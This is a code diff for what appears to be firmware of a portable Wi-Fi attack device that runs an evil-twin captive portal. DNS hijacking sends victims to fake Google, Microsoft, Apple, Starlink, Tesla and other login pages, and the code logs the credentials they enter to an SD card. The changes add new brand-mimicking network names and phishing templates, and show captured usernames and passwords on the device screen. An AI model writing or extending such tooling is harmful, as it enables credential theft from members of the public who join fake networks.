@@ -6,7 +6,7 @@
  *   2. DNS server binds to port 53, answers every query with our AP IP
  *      so the victim's phone auto-opens the portal.
  *   3. HTTP server on port 80 serves the portal HTML and captures form
- *      POSTs (/login) into /poseidon/creds.log on SD card.
+ *      POSTs (/login) into /poseidon/credentials/creds.log on SD card.
  *
  * Templates: Google, Facebook, Microsoft, Free WiFi. User picks one.
  *
@@ -141,6 +141,9 @@ static const char *PRESET_SSIDS[] = {
     "Free Airport WiFi",
     "Library WiFi",
     "GuestNetwork",
+    "Starlink",
+    "Tesla Guest",
+    "Supercharger WiFi",
     "Marriott_GUEST",
     "Hilton Honors",
     "Hyatt Guest WiFi",
@@ -162,28 +165,31 @@ enum ssid_source_t {
 struct ssid_source_opt_t { const char *label; const char *hint; };
 static const ssid_source_opt_t SSID_SRC_OPTS[SSID_SRC__COUNT] = {
     { "Template name",  "uses brand (e.g. Apple ID, Office 365)" },
-    { "Preset public",  "23 legit-mimic names (xfinity, Starbucks)" },
+    { "Preset public",  "26 legit-mimic names (xfinity, Starlink, Tesla)" },
     { "Clone scanned",  "SSID of last AP picked in WiFi - Scan" },
     { "Type custom",    "enter any string up to 32 chars" },
 };
 
 static const portal_template_t s_templates[] = {
-    { "Google",       HTML_GOOGLE      },
-    { "Facebook",     HTML_FACEBOOK    },
-    { "Microsoft",    HTML_MICROSOFT   },
-    { "Free WiFi",    HTML_FREEWIFI    },
-    { "Apple ID",     HTML_APPLE       },
-    { "Office 365",   HTML_OFFICE365   },
-    { "LinkedIn",     HTML_LINKEDIN    },
-    { "Amazon",       HTML_AMAZON      },
-    { "Netflix",      HTML_NETFLIX     },
-    { "Instagram",    HTML_INSTAGRAM   },
-    { "Hotel WiFi",   HTML_HOTEL       },
-    { "Starbucks",    HTML_STARBUCKS   },
-    { "Airport WiFi", HTML_AIRPORT     },
-    { "Router Admin", HTML_ROUTER      },
-    { "Zoom",         HTML_ZOOM        },
-    { "Company SSO",  HTML_SSO         },
+    { "Google",          HTML_GOOGLE      },
+    { "Facebook",        HTML_FACEBOOK    },
+    { "Microsoft",       HTML_MICROSOFT   },
+    { "Free WiFi",       HTML_FREEWIFI    },
+    { "Apple ID",        HTML_APPLE       },
+    { "Office 365",      HTML_OFFICE365   },
+    { "LinkedIn",        HTML_LINKEDIN    },
+    { "Amazon",          HTML_AMAZON      },
+    { "Netflix",         HTML_NETFLIX     },
+    { "Instagram",       HTML_INSTAGRAM   },
+    { "Hotel WiFi",      HTML_HOTEL       },
+    { "Starbucks",       HTML_STARBUCKS   },
+    { "Airport WiFi",    HTML_AIRPORT     },
+    { "Router Admin",    HTML_ROUTER      },
+    { "Router Firmware", HTML_FIRMWARE    },
+    { "Starlink",        HTML_STARLINK    },
+    { "Tesla WiFi",      HTML_TESLA       },
+    { "Zoom",            HTML_ZOOM        },
+    { "Company SSO",     HTML_SSO         },
 };
 #define TEMPLATE_COUNT (sizeof(s_templates)/sizeof(s_templates[0]))
 
@@ -206,10 +212,12 @@ static uint8_t  s_portal_channel = 1;
  * 1.2s action-overlay animation. */
 static volatile bool s_cred_flash = false;
 static char          s_last_user[48] = {0};
+static char          s_last_pass[48] = {0};
 
 static void log_cred(const String &u, const String &p, const String &src)
 {
-    File f = SD.open("/poseidon/creds.log", FILE_APPEND);
+    sd_ensure_layout();
+    File f = SD.open(SD_CREDS_PATH, FILE_APPEND);
     if (!f) return;
     f.printf("%lu,%s,%s,%s,%s\n",
              (unsigned long)(millis() / 1000),
@@ -220,6 +228,8 @@ static void log_cred(const String &u, const String &p, const String &src)
      * inside handleClient() and blocking here delays the 200 response. */
     strncpy(s_last_user, u.c_str(), sizeof(s_last_user) - 1);
     s_last_user[sizeof(s_last_user) - 1] = '\0';
+    strncpy(s_last_pass, p.c_str(), sizeof(s_last_pass) - 1);
+    s_last_pass[sizeof(s_last_pass) - 1] = '\0';
     s_cred_flash = true;
     Serial.printf("[portal] CRED u=%s p=%s\n", u.c_str(), p.c_str());
 }
@@ -621,9 +631,13 @@ static void run_portal(void)
         if (s_cred_flash) {
             s_cred_flash = false;
             sfx_pmkid_capture();
+            char cred_sub[70];
+            snprintf(cred_sub, sizeof(cred_sub), "%.16s : %.16s",
+                     s_last_user[0] ? s_last_user : "?",
+                     s_last_pass[0] ? s_last_pass : "?");
             ui_action_overlay_with_tick("CRED CAPTURED",
-                              s_last_user[0] ? s_last_user : "no user",
-                              ACT_BG_WAVES, T_BAD, 1200,
+                              cred_sub,
+                              ACT_BG_WAVES, T_BAD, 1500,
                               [](void *){
                                   if (s_dns) s_dns->processNextRequest();
                                   if (s_http) s_http->handleClient();
@@ -633,14 +647,19 @@ static void run_portal(void)
 
         if (millis() - last > 250) {
             last = millis();
-            d.fillRect(0, BODY_Y + 54, SCR_W, 28, T_BG);
+            d.fillRect(0, BODY_Y + 54, SCR_W, 36, T_BG);
             d.setTextColor(T_FG, T_BG);
             wifi_sta_list_t stas = {};
             esp_wifi_ap_get_sta_list(&stas);
-            d.setCursor(4, BODY_Y + 54); d.printf("clients:%d  hits:%lu",
+            d.setCursor(4, BODY_Y + 54); d.printf("clients:%d  hits:%-5lu",
                                                  stas.num, (unsigned long)s_hits);
             d.setTextColor(s_creds > 0 ? T_GOOD : T_DIM, T_BG);
-            d.setCursor(4, BODY_Y + 66); d.printf("creds:  %lu", (unsigned long)s_creds);
+            d.setCursor(4, BODY_Y + 66); d.printf("creds:  %-5lu", (unsigned long)s_creds);
+            if (s_last_user[0]) {
+                d.setTextColor(T_WARN, T_BG);
+                d.setCursor(4, BODY_Y + 78);
+                d.printf("> %.15s:%.15s", s_last_user, s_last_pass);
+            }
             ui_draw_status(radio_name(), "portal");
         }
 
